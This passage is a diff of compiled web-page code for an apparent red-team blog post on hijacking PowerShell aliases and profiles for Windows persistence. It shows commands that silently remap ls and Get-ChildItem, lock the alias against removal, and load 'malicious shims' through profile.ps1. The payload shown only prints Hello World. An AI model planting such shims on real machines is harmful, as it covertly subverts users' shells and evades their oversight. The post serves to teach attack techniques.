+    &quot;rel&quot;: &quot;noreferrer&quot;
+  }), &quot;SharpHide&quot;), &quot;\nor\n&quot;, mdx(&quot;a&quot;, _extends({
+    parentName: &quot;p&quot;
+  }, {
+    &quot;href&quot;: &quot;https://github.com/fireeye/SharPersist&quot;,
+    &quot;target&quot;: &quot;_blank&quot;,
+    &quot;rel&quot;: &quot;noreferrer&quot;
+  }), &quot;SharPerist&quot;), &quot;. However, I wanted to create something\nfrom scratch and do something different. The problem I faced was that it\u2019s hard to be unique\nand create something from scratch when a lot of tools already exist that accomplish your vision. Luckily, I had an idea because when red teaming for Linux one technique for persistence is shimming aliases through .bashrc\nor .bash_aliases. However, I could not find any tools or much research in regards to using aliases for red teaming Windows. Thus began my journey!&quot;), mdx(&quot;h3&quot;, {
+    &quot;id&quot;: &quot;understanding-aliases&quot;
+  }, &quot;Understanding Aliases&quot;), mdx(&quot;p&quot;, null, &quot;With Powershell becoming more and more prevalent for both red teamers\nand blue teamers I focused my research into Powershell aliases instead of Command Prompt aliases. By simply doing\nGet-Alias in Powershell you will see that a lot of things are aliased, some of the most useful and surprising ones are cat, clear, cp, iex, iwr, and ls. This is only a small snippet out of the 158 built-in aliases with Powershell version 5.\nMicrosoft defines an alias as: \u201Can alternate name or nickname for a cmdlet or for a command element, such as a function, script, file, or executable file. You can use the alias instead of the command name in any PowerShell commands.\u201D&quot;), mdx(&quot;h3&quot;, {
+    &quot;id&quot;: &quot;basic-shimming-with-one-alias&quot;
+  }, &quot;Basic Shimming with one Alias&quot;), mdx(&quot;p&quot;, null, &quot;Now that we understand what an Alias is and just how prevalent they are\nin Powershell now it\u2019s time to shim one. Let\u2019s shim the alias ls as it is fairly common. First let\u2019s see what the ls alias is defined as, to do that we simply type &quot;, mdx(&quot;br&quot;, null)), mdx(&quot;pre&quot;, null, mdx(&quot;code&quot;, _extends({
+    parentName: &quot;pre&quot;
+  }, {
+    &quot;className&quot;: &quot;language-powershell&quot;
+  }), &quot;(Get-Alias -Name ls).Definition\n&quot;)), mdx(&quot;p&quot;, null, &quot;This returns Get-ChildItem which is what ls is aliased to.&quot;), mdx(&quot;p&quot;, null, mdx(&quot;span&quot;, _extends({
+    parentName: &quot;p&quot;
+  }, {
+    &quot;className&quot;: &quot;gatsby-resp-image-wrapper&quot;,
+    &quot;style&quot;: {
+      &quot;position&quot;: &quot;relative&quot;,
+      &quot;display&quot;: &quot;block&quot;,
+      &quot;marginLeft&quot;: &quot;auto&quot;,
+      &quot;marginRight&quot;: &quot;auto&quot;,
+      &quot;maxWidth&quot;: &quot;1234px&quot;
+    }
+  }), &quot;\n      &quot;, mdx(&quot;span&quot;, _extends({
+    parentName: &quot;span&quot;
+  }, {
+    &quot;className&quot;: &quot;gatsby-resp-image-background-image&quot;,
+    &quot;style&quot;: {
+      &quot;paddingBottom&quot;: &quot;70.42139384116695%&quot;,
+      &quot;position&quot;: &quot;relative&quot;,
+      &quot;bottom&quot;: &quot;0&quot;,
+      &quot;left&quot;: &quot;0&quot;,
+      &quot;backgroundImage&quot;: &quot;url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAOCAIAAACgpqunAAAACXBIWXMAABJ0AAASdAHeZh94AAAB/0lEQVQoz52R20/TUBzHf4Nt4NSgkQgbBEa77uYgxEuCE6U6oy+ohLCt7MK8zA224QV5MSb64rv6oA/qX2eiiY512MLatT2n/tot8WGAiSffnH5P+/v0dznw42f92/dGq/m7vSvJoiw3ZaVZV5o7hiqZ+j7V9lBdo+/Zx+5L0pZBa6uSRMSGLomaKOqNX3RX1HfqqrJPFdVoK1RVSaulo9EUU1WIphPTXpRSUFWFmiahFNXdqH0kVDeIYVCD4G6bjgjpBOuGAdTQzP9dsPX2a/nVp9qbz6WXH3Nb7wrb79deWCpsf0B/hCqvv8CpmRxMrcDEsoNNO4MCeO+C7x6MLcHZRRi5A6OHaGTRigwlaq6QcObCA//CxtS16smZ/InpfODGpneuOBBe7ecE/GOv+oPCYDQDk/NlYJJ+vsolnoxfWUfSFVoN3nwaufUMYWCTjkCqVxBIYUoYu1x0hgRPLD8YzR47l/XEcp5YdiCScYWFPi59IPkX9l8tD1965IuXhy8+xJqRxHqwqsNydmE25cK6xuNFfDiD6ePT+aHZAn5A0h3JONgkRvwDDlyvYM/eeIlLbDJ81U6ei95+zvK1o3ruwCy/gXl88dLE/Pro3GMkcQSTCxWGr1k3x6yAVUKPmCSGWfDp8/eHZtfc1sWkcQwd08el0BwoHKc7nME2/wBcPGjQqG8a3wAAAABJRU5ErkJggg==&apos;)&quot;,
+      &quot;backgroundSize&quot;: &quot;cover&quot;,
+      &quot;display&quot;: &quot;block&quot;
+    }
+  })), &quot;\n  &quot;, mdx(&quot;picture&quot;, {
+    parentName: &quot;span&quot;
+  }, &quot;\n        &quot;, mdx(&quot;source&quot;, _extends({
+    parentName: &quot;picture&quot;
+  }, {
+    &quot;srcSet&quot;: [&quot;/static/020cda62d41a8bf50ea82c8709683492/c2bb4/basic.webp 1234w&quot;],
+    &quot;sizes&quot;: &quot;(max-width: 1234px) 100vw, 1234px&quot;,
+    &quot;type&quot;: &quot;image/webp&quot;
+  })), &quot;\n        &quot;, mdx(&quot;source&quot;, _extends({
+    parentName: &quot;picture&quot;
+  }, {
+    &quot;srcSet&quot;: [&quot;/static/020cda62d41a8bf50ea82c8709683492/597b7/basic.png 1234w&quot;],
+    &quot;sizes&quot;: &quot;(max-width: 1234px) 100vw, 1234px&quot;,
+    &quot;type&quot;: &quot;image/png&quot;
+  })), &quot;\n        &quot;, mdx(&quot;img&quot;, _extends({
+    parentName: &quot;picture&quot;
+  }, {
+    &quot;className&quot;: &quot;gatsby-resp-image-image&quot;,
+    &quot;src&quot;: &quot;/static/020cda62d41a8bf50ea82c8709683492/597b7/basic.png&quot;,
+    &quot;alt&quot;: &quot;Automate&quot;,
+    &quot;title&quot;: &quot;Automate&quot;,
+    &quot;loading&quot;: &quot;lazy&quot;,
+    &quot;style&quot;: {
+      &quot;width&quot;: &quot;100%&quot;,
+      &quot;height&quot;: &quot;100%&quot;,
+      &quot;margin&quot;: &quot;0&quot;,
+      &quot;verticalAlign&quot;: &quot;middle&quot;,
+      &quot;position&quot;: &quot;absolute&quot;,
+      &quot;top&quot;: &quot;0&quot;,
+      &quot;left&quot;: &quot;0&quot;
+    }
+  })), &quot;\n      &quot;), &quot;\n    &quot;)), mdx(&quot;p&quot;, null, &quot;As we can see here the alias for ls has been redefined to:&quot;), mdx(&quot;pre&quot;, null, mdx(&quot;code&quot;, _extends({
+    parentName: &quot;pre&quot;
+  }, {
+    &quot;className&quot;: &quot;language-powershell&quot;
+  }), &quot;{Get-ChildItem; hello_world}\n&quot;)), mdx(&quot;p&quot;, null, &quot;hello_world being our function that simply prints Hello World!&quot;), mdx(&quot;p&quot;, null, &quot;Let\u2019s break down what we are actually doing:&quot;), mdx(&quot;p&quot;, null, &quot;hello_world function simply prints Hello World!\nshimmed_ls is the name of the function we are going to realias ls to\nthis function simply does Get-ChildItem which is what ls was originally mapped to.\nNow it is realiased to Get-ChildItem; hello_world&quot;), mdx(&quot;p&quot;, null, &quot;Lastly, let\u2019s break the command that sets the alias.&quot;), mdx(&quot;pre&quot;, null, mdx(&quot;code&quot;, _extends({
+    parentName: &quot;pre&quot;
+  }, {
+    &quot;className&quot;: &quot;language-powershell&quot;
+  }), &quot;Set-Alias -Name ls -Value shimmed_ls -Option AllScope -Scope Global -ErrorAction SilentlyContinue -Force\n&quot;)), mdx(&quot;ul&quot;, null, mdx(&quot;li&quot;, {
+    parentName: &quot;ul&quot;
+  }, mdx(&quot;p&quot;, {
+    parentName: &quot;li&quot;
+  }, mdx(&quot;strong&quot;, {
+    parentName: &quot;p&quot;
+  }, &quot;Name ls&quot;), &quot;: Name of our alias we are realiasing&quot;)), mdx(&quot;li&quot;, {
+    parentName: &quot;ul&quot;
+  }, mdx(&quot;p&quot;, {
+    parentName: &quot;li&quot;
+  }, mdx(&quot;strong&quot;, {
+    parentName: &quot;p&quot;
+  }, &quot;Value shimmed_ls&quot;), &quot;: What we are realiasing ls to&quot;)), mdx(&quot;li&quot;, {
+    parentName: &quot;ul&quot;
+  }, mdx(&quot;p&quot;, {
+    parentName: &quot;li&quot;
+  }, mdx(&quot;strong&quot;, {
+    parentName: &quot;p&quot;
+  }, &quot;Option AllScope&quot;), &quot;: Alias is copied to any new scopes that are created&quot;)), mdx(&quot;li&quot;, {
+    parentName: &quot;ul&quot;
+  }, mdx(&quot;p&quot;, {
+    parentName: &quot;li&quot;
+  }, mdx(&quot;strong&quot;, {
+    parentName: &quot;p&quot;
+  }, &quot;Scope Global&quot;), &quot;: Scope in which alias is valid. Global means scope is in effect when PowerShell starts.&quot;)), mdx(&quot;li&quot;, {
+    parentName: &quot;ul&quot;
+  }, mdx(&quot;p&quot;, {
+    parentName: &quot;li&quot;
+  }, mdx(&quot;strong&quot;, {
+    parentName: &quot;p&quot;
+  }, &quot;ErrorAction&quot;), &quot;: If an error should occur for whatever reason it will not error display an error message user as that may alert the user, rather just silently continue.&quot;)), mdx(&quot;li&quot;, {
+    parentName: &quot;ul&quot;
+  }, mdx(&quot;p&quot;, {
+    parentName: &quot;li&quot;
+  }, mdx(&quot;strong&quot;, {
+    parentName: &quot;p&quot;
+  }, &quot;Force&quot;), &quot;: This is required as the majority of built-in PowerShell aliases are ReadOnly which means they cannot be changed or deleted unless the Force parameter is used. To see which aliases are ReadOnly do: &quot;))), mdx(&quot;pre&quot;, null, mdx(&quot;code&quot;, _extends({
+    parentName: &quot;pre&quot;
+  }, {
+    &quot;className&quot;: &quot;language-powershell&quot;
+  }), &quot;Get-Alias | Where-Object {$_.Options -Match \&quot;ReadOnly\&quot;}\n&quot;)), mdx(&quot;h3&quot;, {
+    &quot;id&quot;: &quot;basic-removal-of-the-shim&quot;
+  }, &quot;Basic Removal of the Shim&quot;), mdx(&quot;p&quot;, null, &quot;Now that we have remapped an alias, you\u2019re probably\nwondering how do I remove it?&quot;), mdx(&quot;p&quot;, null, &quot;The answer is simple as we can just do:&quot;), mdx(&quot;pre&quot;, null, mdx(&quot;code&quot;, _extends({
+    parentName: &quot;pre&quot;
+  }, {
+    &quot;className&quot;: &quot;language-powershell&quot;
+  }), &quot;Remove-Alias -Name ls -Force\nOr\nRemove-Item alias:ls -Force\n&quot;)), mdx(&quot;p&quot;, null, &quot;That works just fine as ls is no longer aliased our shim no longer works.&quot;), mdx(&quot;br&quot;, null), mdx(&quot;p&quot;, null, &quot;However, we can fix that :)&quot;), mdx(&quot;br&quot;, null), mdx(&quot;p&quot;, null, &quot;Now when you do Set-Alias instead of  &quot;, mdx(&quot;strong&quot;, {
+    parentName: &quot;p&quot;
+  }, &quot;-Option AllScope&quot;), &quot; do\n&quot;, mdx(&quot;strong&quot;, {
+    parentName: &quot;p&quot;
+  }, &quot;-Option AllScope, Constant&quot;)), mdx(&quot;p&quot;, null, &quot;Let\u2019s try deleting it now, we will even run PowerShell as an administrator&quot;), mdx(&quot;p&quot;, null, mdx(&quot;span&quot;, _extends({
+    parentName: &quot;p&quot;
+  }, {
+    &quot;className&quot;: &quot;gatsby-resp-image-wrapper&quot;,
+    &quot;style&quot;: {
+      &quot;position&quot;: &quot;relative&quot;,
+      &quot;display&quot;: &quot;block&quot;,
+      &quot;marginLeft&quot;: &quot;auto&quot;,
+      &quot;marginRight&quot;: &quot;auto&quot;,
+      &quot;maxWidth&quot;: &quot;1255px&quot;
+    }
+  }), &quot;\n      &quot;, mdx(&quot;span&quot;, _extends({
+    parentName: &quot;span&quot;
+  }, {
+    &quot;className&quot;: &quot;gatsby-resp-image-background-image&quot;,
+    &quot;style&quot;: {
+      &quot;paddingBottom&quot;: &quot;52.430278884462155%&quot;,
+      &quot;position&quot;: &quot;relative&quot;,
+      &quot;bottom&quot;: &quot;0&quot;,
+      &quot;left&quot;: &quot;0&quot;,
+      &quot;backgroundImage&quot;: &quot;url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAKCAIAAAA7N+mxAAAACXBIWXMAABJ0AAASdAHeZh94AAABwElEQVQoz53Qy2sTQRwH8LEFEUqt0DwPBa2xqZtXKTSR3jwoVvFQSl7dKNjEm2Bt6d3/0YOnmuaxyXZ3Z5/ZzTx3nPUg4kn88mGY7wy/OQz4PprNdHMyhzdTfapD20fekrphwgmZs8B+xNyQuAviL/lvgYQ4uB6Ov11rs1sXWtataVuWDR3DNHXTgjp0TNNwHNuwZKAXLLwg8PyE6weW7QHH80xrCfUotBA0sG1Qz/BdI6CICMY4o5zQmFJGSCw3hHJKOSNC8CgMQBSFjAmMYoI5xpygGOMYyYpiSmJMOMExIfKKyUqJkI/IcSGEHyTDkfg7sfiH+L4PEFqK/wpCCAxHk/F0PtF0uY41SZ9oss5/jDVp+MvNH4ajqSZ/0/ZM6ILD46vyq/Pam8vSy/Pq0Zfa6wtZC88/5Rr93LNBvjHINvqbB/3UQT9dT2Tq8vxjpj548e4rUA7Pinu9wl4vX+qmle6D3c5Gsb2200o2u21pvdi+W2jdK7RWHzdXtpvg4cmdRydg67h69Blk6x9SFXVr//26cnpf6aYr6mbpNF1WMxU1VU5kq2q+2svVehtKd+1pZ+VJe3WnA7ab+28vfwJAlrjM0vN6CAAAAABJRU5ErkJggg==&apos;)&quot;,
+      &quot;backgroundSize&quot;: &quot;cover&quot;,
+      &quot;display&quot;: &quot;block&quot;
+    }
+  })), &quot;\n  &quot;, mdx(&quot;picture&quot;, {
+    parentName: &quot;span&quot;
+  }, &quot;\n        &quot;, mdx(&quot;source&quot;, _extends({
+    parentName: &quot;picture&quot;
+  }, {
+    &quot;srcSet&quot;: [&quot;/static/00e58dcd33a1beaa463d48a8837577ee/aecae/removeme.webp 1255w&quot;],
+    &quot;sizes&quot;: &quot;(max-width: 1255px) 100vw, 1255px&quot;,
+    &quot;type&quot;: &quot;image/webp&quot;
+  })), &quot;\n        &quot;, mdx(&quot;source&quot;, _extends({
+    parentName: &quot;picture&quot;
+  }, {
+    &quot;srcSet&quot;: [&quot;/static/00e58dcd33a1beaa463d48a8837577ee/d90ba/removeme.png 1255w&quot;],
+    &quot;sizes&quot;: &quot;(max-width: 1255px) 100vw, 1255px&quot;,
+    &quot;type&quot;: &quot;image/png&quot;
+  })), &quot;\n        &quot;, mdx(&quot;img&quot;, _extends({
+    parentName: &quot;picture&quot;
+  }, {
+    &quot;className&quot;: &quot;gatsby-resp-image-image&quot;,
+    &quot;src&quot;: &quot;/static/00e58dcd33a1beaa463d48a8837577ee/d90ba/removeme.png&quot;,
+    &quot;alt&quot;: &quot;RemoveMe&quot;,
+    &quot;title&quot;: &quot;RemoveMe&quot;,
+    &quot;loading&quot;: &quot;lazy&quot;,
+    &quot;style&quot;: {
+      &quot;width&quot;: &quot;100%&quot;,
+      &quot;height&quot;: &quot;100%&quot;,
+      &quot;margin&quot;: &quot;0&quot;,
+      &quot;verticalAlign&quot;: &quot;middle&quot;,
+      &quot;position&quot;: &quot;absolute&quot;,
+      &quot;top&quot;: &quot;0&quot;,
+      &quot;left&quot;: &quot;0&quot;
+    }
+  })), &quot;\n      &quot;), &quot;\n    &quot;)), mdx(&quot;p&quot;, null, &quot;PowerShell now throws an error as the alias is a constant!&quot;), mdx(&quot;h3&quot;, {
+    &quot;id&quot;: &quot;taking-it-one-step-further&quot;
+  }, &quot;Taking it one Step Further&quot;), mdx(&quot;p&quot;, null, &quot;Now that we have learned how to realias aliases to our shimmed version\nwouldn\u2019t it be nice to just cut out the middle man. Instead of relaliasing aliases\nlet\u2019s just redefine what the alias is defined as!&quot;), mdx(&quot;p&quot;, null, &quot;Back to our favorite example with ls\nwe saw that it was aliased to Get-ChildItem so lets try redefining\nwhat Get-ChildItem is:&quot;), mdx(&quot;p&quot;, null, mdx(&quot;span&quot;, _extends({
+    parentName: &quot;p&quot;
+  }, {
+    &quot;className&quot;: &quot;gatsby-resp-image-wrapper&quot;,
+    &quot;style&quot;: {
+      &quot;position&quot;: &quot;relative&quot;,
+      &quot;display&quot;: &quot;block&quot;,
+      &quot;marginLeft&quot;: &quot;auto&quot;,
+      &quot;marginRight&quot;: &quot;auto&quot;,
+      &quot;maxWidth&quot;: &quot;1077px&quot;
+    }
+  }), &quot;\n      &quot;, mdx(&quot;span&quot;, _extends({
+    parentName: &quot;span&quot;
+  }, {
+    &quot;className&quot;: &quot;gatsby-resp-image-background-image&quot;,
+    &quot;style&quot;: {
+      &quot;paddingBottom&quot;: &quot;70.93779015784587%&quot;,
+      &quot;position&quot;: &quot;relative&quot;,
+      &quot;bottom&quot;: &quot;0&quot;,
+      &quot;left&quot;: &quot;0&quot;,
+      &quot;backgroundImage&quot;: &quot;url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAOCAIAAACgpqunAAAACXBIWXMAABJ0AAASdAHeZh94AAABvElEQVQoz52RyU/CQBTGB3ENrgjiEhQCosiOqGhwuRmjhINiRSkiyGY8aCLhb/XgTYUKbay0FCy0vsrFQOjB5pf2vZl+830zg0pl6vml9PpG1T+rLPlJV5gq9cWRJY4ieParWa/yHMBAIXwzHSC+ydfrTZbhYZZjWjQt0LTIVJu1WqPBCY2ayLECw4o1ThBEsQMktFrifx9UJCrFD5KoUJD/nSCLBEmUpRp4LZYlSpU2b10gbyhvPXxwB/OO4yfb0eN6qOAJ5r2hguskbzy4n9/OzGze9gIZ9nILO5m57bTaewPMbqXU6zfTvoTGl1QuY8h4hgynPdEHMrqt1Kw/NemJD6xeIFO4bxnrM5+334p20QM04Y6pHDgw5sSnPPExB64whX81klIetLCTlv4zhQdXIxpfYsJ9DeawlmYj2b8iBZETq71x9Kscd8VGbFGVHYdRpQUbdUKW2JD1Epl6i+f8t/AZd10b9u/gkHSbUjtojegD2cVATmWPypgjrS8B06MuXL+bg9jajSSMDtuudP4U3MLI2pWcGGIrzJjScgEJAcjfPi2oVY4otHKxl3azYAKGsFsw+evT0XbzAzYNVl0qw/B6AAAAAElFTkSuQmCC&apos;)&quot;,
+      &quot;backgroundSize&quot;: &quot;cover&quot;,
+      &quot;display&quot;: &quot;block&quot;
+    }
+  })), &quot;\n  &quot;, mdx(&quot;picture&quot;, {
+    parentName: &quot;span&quot;
+  }, &quot;\n        &quot;, mdx(&quot;source&quot;, _extends({
+    parentName: &quot;picture&quot;
+  }, {
+    &quot;srcSet&quot;: [&quot;/static/e549a724c271a943c658d842798ef103/e87cb/advanced.webp 1077w&quot;],
+    &quot;sizes&quot;: &quot;(max-width: 1077px) 100vw, 1077px&quot;,
+    &quot;type&quot;: &quot;image/webp&quot;
+  })), &quot;\n        &quot;, mdx(&quot;source&quot;, _extends({
+    parentName: &quot;picture&quot;
+  }, {
+    &quot;srcSet&quot;: [&quot;/static/e549a724c271a943c658d842798ef103/6977f/advanced.png 1077w&quot;],
+    &quot;sizes&quot;: &quot;(max-width: 1077px) 100vw, 1077px&quot;,
+    &quot;type&quot;: &quot;image/png&quot;
+  })), &quot;\n        &quot;, mdx(&quot;img&quot;, _extends({
+    parentName: &quot;picture&quot;
+  }, {
+    &quot;className&quot;: &quot;gatsby-resp-image-image&quot;,
+    &quot;src&quot;: &quot;/static/e549a724c271a943c658d842798ef103/6977f/advanced.png&quot;,
+    &quot;alt&quot;: &quot;Advanced&quot;,
+    &quot;title&quot;: &quot;Advanced&quot;,
+    &quot;loading&quot;: &quot;lazy&quot;,
+    &quot;style&quot;: {
+      &quot;width&quot;: &quot;100%&quot;,
+      &quot;height&quot;: &quot;100%&quot;,
+      &quot;margin&quot;: &quot;0&quot;,
+      &quot;verticalAlign&quot;: &quot;middle&quot;,
+      &quot;position&quot;: &quot;absolute&quot;,
+      &quot;top&quot;: &quot;0&quot;,
+      &quot;left&quot;: &quot;0&quot;
+    }
+  })), &quot;\n      &quot;), &quot;\n    &quot;)), mdx(&quot;p&quot;, null, &quot;Get-ChildItem has been redefined to spawn a powershell session that simply calls Get-ChildItem. PowerShell is called with the flag -nop short for NoProfile as to not load profiles.&quot;), mdx(&quot;h3&quot;, {
+    &quot;id&quot;: &quot;powershell-profiles-to-the-rescue&quot;
+  }, &quot;PowerShell Profiles to the Rescue&quot;), mdx(&quot;p&quot;, null, &quot;There is one big problem with aliasing, our shimmed aliases\nonly exist within the current PowerShell session.\nThat means when a user opens up a new PowerShell session all our hard work\nis lost. Luckily, PowerShell profiles exist, a profile is a PowerShell script that runs whenever the user opens up PowerShell. Profiles are documented in the MITRE attack\nframework as\n&quot;, mdx(&quot;a&quot;, _extends({
+    parentName: &quot;p&quot;
+  }, {
+    &quot;href&quot;: &quot;https://attack.mitre.org/techniques/T1504/%22&quot;,
+    &quot;target&quot;: &quot;_blank&quot;,
+    &quot;rel&quot;: &quot;noreferrer&quot;
+  }), &quot;T1504&quot;), &quot;\n. What this means for us is that we need to create that special profile called profile.ps1 that will load our malicious shims whenever a user opens up PowerShell.&quot;), mdx(&quot;p&quot;, null, mdx(&quot;strong&quot;, {
+    parentName: &quot;p&quot;
+  }, &quot;The Four Different Locations of Powershell Profiles&quot;), &quot;:&quot;), mdx(&quot;p&quot;, null, mdx(&quot;span&quot;, _extends({
+    parentName: &quot;p&quot;
+  }, {
+    &quot;className&quot;: &quot;gatsby-resp-image-wrapper&quot;,
+    &quot;style&quot;: {
+      &quot;position&quot;: &quot;relative&quot;,
+      &quot;display&quot;: &quot;block&quot;,
+      &quot;marginLeft&quot;: &quot;auto&quot;,
+      &quot;marginRight&quot;: &quot;auto&quot;,
+      &quot;maxWidth&quot;: &quot;574px&quot;
+    }
+  }), &quot;\n      &quot;, mdx(&quot;span&quot;, _extends({
+    parentName: &quot;span&quot;
+  }, {
+    &quot;className&quot;: &quot;gatsby-resp-image-background-image&quot;,
+    &quot;style&quot;: {
+      &quot;paddingBottom&quot;: &quot;60.97560975609756%&quot;,
+      &quot;position&quot;: &quot;relative&quot;,
+      &quot;bottom&quot;: &quot;0&quot;,
+      &quot;left&quot;: &quot;0&quot;,
+      &quot;backgroundImage&quot;: &quot;url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAMCAIAAADtbgqsAAAACXBIWXMAABJ0AAASdAHeZh94AAABDklEQVQoz6VR2XLDMAjU/39kj9ROM9OJJSSh23ZWoumkbdqX7NgYgdjFoIzRz08vh9dDznnf923bYHNOb9Mk/j9QMUa9LEQUYqi1SgEcrXXsSCkmif+Gyrk4SxyYyOKqULbWQKeNFkhTd5RLKd77GAMeaymnXl9bJQvAOPZMBlQkZ+vsVyOq5MKM4hQGkBBlOYKXmVOM/RMCd8u3bWdjBqN3GF4S5VoNGW0WRKR/Mh1wluV8Pn+A/bNt55xnLzpQQmJdV+4ybij1OFRH0reebte2UWxHMQewoIV1bQjOx3masK8ZOA7//XTChf1mf+ruGMFaOipe/BdMyUnG8W3acrWvd7s6f+NHVu0P4KHiC9Z1vXZjtE7XAAAAAElFTkSuQmCC&apos;)&quot;,
+      &quot;backgroundSize&quot;: &quot;cover&quot;,
+      &quot;display&quot;: &quot;block&quot;
+    }
+  })), &quot;\n  &quot;, mdx(&quot;picture&quot;, {
+    parentName: &quot;span&quot;
+  }, &quot;\n        &quot;, mdx(&quot;source&quot;, _extends({
+    parentName: &quot;picture&quot;
+  }, {
+    &quot;srcSet&quot;: [&quot;/static/b9b4cdd50d526ae8b131bc942f61d429/723c8/profile_locations_pshome.webp 574w&quot;],
+    &quot;sizes&quot;: &quot;(max-width: 574px) 100vw, 574px&quot;,
+    &quot;type&quot;: &quot;image/webp&quot;
+  })), &quot;\n        &quot;, mdx(&quot;source&quot;, _extends({
+    parentName: &quot;picture&quot;
+  }, {
+    &quot;srcSet&quot;: [&quot;/static/b9b4cdd50d526ae8b131bc942f61d429/bf737/profile_locations_pshome.png 574w&quot;],
+    &quot;sizes&quot;: &quot;(max-width: 574px) 100vw, 574px&quot;,
+    &quot;type&quot;: &quot;image/png&quot;
+  })), &quot;\n        &quot;, mdx(&quot;img&quot;, _extends({
+    parentName: &quot;picture&quot;
+  }, {
+    &quot;className&quot;: &quot;gatsby-resp-image-image&quot;,
+    &quot;src&quot;: &quot;/static/b9b4cdd50d526ae8b131bc942f61d429/bf737/profile_locations_pshome.png&quot;,
+    &quot;alt&quot;: &quot;Profile_Locations&quot;,
+    &quot;title&quot;: &quot;Profile_Locations&quot;,
+    &quot;loading&quot;: &quot;lazy&quot;,
+    &quot;style&quot;: {
+      &quot;width&quot;: &quot;100%&quot;,
+      &quot;height&quot;: &quot;100%&quot;,
+      &quot;margin&quot;: &quot;0&quot;,
+      &quot;verticalAlign&quot;: &quot;middle&quot;,
+      &quot;position&quot;: &quot;absolute&quot;,
+      &quot;top&quot;: &quot;0&quot;,
+      &quot;left&quot;: &quot;0&quot;
+    }
+  })), &quot;\n      &quot;), &quot;\n    &quot;)), mdx(&quot;p&quot;, null, mdx(&quot;strong&quot;, {
+    parentName: &quot;p&quot;
+  }, &quot;$PSHOME = C:\\Windows\\System32\\WindowsPowerShell\\v1.0&quot;)), mdx(&quot;br&quot;, null), mdx(&quot;p&quot;, null, mdx(&quot;strong&quot;, {
+    parentName: &quot;p&quot;
+  }, &quot;$HOME = C:\\Users&quot;, &quot;[&quot;, &quot;User]&quot;)), mdx(&quot;h4&quot;, {
+    &quot;id&quot;: &quot;you-can-also-do&quot;
+  }, &quot;You can also do&quot;), mdx(&quot;p&quot;, null, mdx(&quot;span&quot;, _extends({
+    parentName: &quot;p&quot;
+  }, {
+    &quot;className&quot;: &quot;gatsby-resp-image-wrapper&quot;,
+    &quot;style&quot;: {
+      &quot;position&quot;: &quot;relative&quot;,
+      &quot;display&quot;: &quot;block&quot;,
+      &quot;marginLeft&quot;: &quot;auto&quot;,
+      &quot;marginRight&quot;: &quot;auto&quot;,
+      &quot;maxWidth&quot;: &quot;587px&quot;
+    }
+  }), &quot;\n      &quot;, mdx(&quot;span&quot;, _extends({
+    parentName: &quot;span&quot;
+  }, {
+    &quot;className&quot;: &quot;gatsby-resp-image-background-image&quot;,
+    &quot;style&quot;: {
+      &quot;paddingBottom&quot;: &quot;46.33730834752981%&quot;,
+      &quot;position&quot;: &quot;relative&quot;,
+      &quot;bottom&quot;: &quot;0&quot;,
+      &quot;left&quot;: &quot;0&quot;,
+      &quot;backgroundImage&quot;: &quot;url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAJCAYAAAAywQxIAAAACXBIWXMAABJ0AAASdAHeZh94AAABCklEQVQoz31S7Y6EIAz0/V/yzn+uIAoFv7XXabbmzHrXZAIpZTpDqcaxcF3X/P1V8ziO/DvO89TVe8etc1fuP1TbtvEwDNz3gxLO88zTNDHyRphz5s77K3ccx4VHQlwwpESCxMuyXEpLKexE4bqu/BQfhCAAQEhEHGNSpaYQubZtxUUv9r3sX9x1Hb+aRu8gTG2177taBWAVakCGvBEiH2PUM8DcYG91N4WkNomzFKQUlcC6qmW5DGVwEeW9g6gLIXCi9GwZlqwzZfoklLMQOo7SbBDbeBIMkqTB41CI0tsGKbm9341QVJlCI0T+j2/TazG+TsnlZkOHImeNDAA28X288zJ1fzW0OsQP11u9bi/oc70AAAAASUVORK5CYII=&apos;)&quot;,
+      &quot;backgroundSize&quot;: &quot;cover&quot;,
+      &quot;display&quot;: &quot;block&quot;
+    }
+  })), &quot;\n  &quot;, mdx(&quot;picture&quot;, {
+    parentName: &quot;span&quot;
+  }, &quot;\n        &quot;, mdx(&quot;source&quot;, _extends({
+    parentName: &quot;picture&quot;
+  }, {
+    &quot;srcSet&quot;: [&quot;/static/f9304adc0e9e1ccc157471317e947f9c/d84e9/profile_locations_profile.webp 587w&quot;],
+    &quot;sizes&quot;: &quot;(max-width: 587px) 100vw, 587px&quot;,
+    &quot;type&quot;: &quot;image/webp&quot;
+  })), &quot;\n        &quot;, mdx(&quot;source&quot;, _extends({
+    parentName: &quot;picture&quot;
+  }, {
+    &quot;srcSet&quot;: [&quot;/static/f9304adc0e9e1ccc157471317e947f9c/3a024/profile_locations_profile.png 587w&quot;],
+    &quot;sizes&quot;: &quot;(max-width: 587px) 100vw, 587px&quot;,
+    &quot;type&quot;: &quot;image/png&quot;
+  })), &quot;\n        &quot;, mdx(&quot;img&quot;, _extends({
+    parentName: &quot;picture&quot;
+  }, {
+    &quot;className&quot;: &quot;gatsby-resp-image-image&quot;,
+    &quot;src&quot;: &quot;/static/f9304adc0e9e1ccc157471317e947f9c/3a024/profile_locations_profile.png&quot;,
+    &quot;alt&quot;: &quot;Profile_Locations&quot;,
+    &quot;title&quot;: &quot;Profile_Locations&quot;,
+    &quot;loading&quot;: &quot;lazy&quot;,
+    &quot;style&quot;: {
+      &quot;width&quot;: &quot;100%&quot;,
+      &quot;height&quot;: &quot;100%&quot;,
+      &quot;margin&quot;: &quot;0&quot;,
+      &quot;verticalAlign&quot;: &quot;middle&quot;,
+      &quot;position&quot;: &quot;absolute&quot;,
+      &quot;top&quot;: &quot;0&quot;,
+      &quot;left&quot;: &quot;0&quot;
+    }
+  })), &quot;\n      &quot;), &quot;\n    &quot;)), mdx(&quot;p&quot;, null, &quot;The two we are focusing on are:&quot;), mdx(&quot;h3&quot;, {
+    &quot;id&quot;: &quot;profilecurrentuserallhosts-and-profilealluserallhosts&quot;
+  }, &quot;$PROFILE.CurrentUserAllHosts&quot;, mdx(&quot;strong&quot;, {
+    parentName: &quot;h3&quot;
+  }, &quot; and &quot;), &quot;$PROFILE.AllUserAllHosts&quot;), mdx(&quot;br&quot;, null), mdx(&quot;p&quot;, null, mdx(&quot;strong&quot;, {
+    parentName: &quot;p&quot;
